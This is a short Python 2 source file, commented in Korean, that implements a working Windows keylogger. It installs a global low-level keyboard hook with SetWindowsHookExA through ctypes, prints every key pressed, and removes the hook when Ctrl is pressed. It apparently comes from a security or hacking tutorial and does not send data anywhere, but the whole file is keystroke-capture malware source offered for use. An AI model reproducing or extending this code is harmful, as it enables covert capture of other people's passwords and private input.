import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

user32 = windll.user32                          #windll으로 user32선언
kernel32 = windll.kernel32                      #windll으로 kernel32선언

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162

class KeyLogger:
	def __init__(self):
		self.lUser32 = user32
		self.hooked = None

	def installHookProc(self, pointer):                     #훅 설정
		self.hooked = self.lUser32.SetWindowsHookExA(   #MSDN에서 제공
			WH_KEYBOARD_LL,                         #어떤 메시지후킹(모든키보드)
			pointer,                                #훅 프로시저
			kernel32.GetModuleHandleW(None),        #후킹할 스레드 DLL
			0                                       #후킹할 스레드 아이디
		)
		if not self.hooked:
			return False
		return True

	def uninstallHookProc(self):                            #훅 해제 
		if self.hooked is None:
			return
		self.lUser32.UnhookWindowsHookEx(self.hooked)
		self.hooked = None

def getFPTR(fn):                #함수 포인터 생성 (CFUNCTYPE는 cdecl 호출규약)
		CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
		return CMPFUNC(fn)

def hookProc(nCode, wParam, lParam):            #훅 프로시저 정의
		if wParam is not WM_KEYDOWN:
			return user32.CallNextHookEx(keyLogger.hooked, nCode,wParam, lParam)
		hookedKey = chr(lParam[0])
		print hookedKey
		if(CTRL_CODE == int(lParam[0])):
			print "Ctrl pressed, call uninstallHook()"
			keyLogger.uninstallHookProc()
			sys.exit(-1)
		return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)

def startKeyLog():
	msg = MSG()
	user32.GetMessageA(byref(msg),0,0,0)
	#GetMessageA()함수가 큐를 모니터링 하다가, 메시지가 들어오면 훅 체인에 전달
		
keyLogger = KeyLogger()
pointer = getFPTR(hookProc)

if keyLogger.installHookProc(pointer):
	print "installed keylogger"

startKeyLog()